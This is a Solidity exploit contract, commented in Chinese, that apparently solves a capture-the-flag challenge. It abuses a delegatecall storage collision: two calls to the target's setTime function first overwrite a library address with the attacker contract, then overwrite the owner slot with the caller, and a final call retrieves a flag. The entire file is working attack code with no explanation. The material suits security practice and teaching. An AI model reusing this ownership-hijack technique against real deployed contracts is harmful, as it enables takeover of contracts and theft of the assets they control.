// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract Attack {
    // 匹配存储布局
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    
    // 攻击函数
    function setTime(uint256) public {
        owner = msg.sender;  // 修改owner为消息发送者
    }
    
    // 触发delegatecall
    function attack(address target) public {
        // 第一次调用：修改timeZone1Library
        bytes4 selector = bytes4(0xf1e02620);
        target.call(abi.encodeWithSelector(selector, uint256(uint160(address(this)))));
        
        // 第二次调用：修改owner
        target.call(abi.encodeWithSelector(selector, uint256(uint160(address(this)))));
        
        // 获取flag
        bytes4 getFlagSelector = bytes4(0xf9633930);
        target.call(abi.encodeWithSelector(getFlagSelector));
    }
}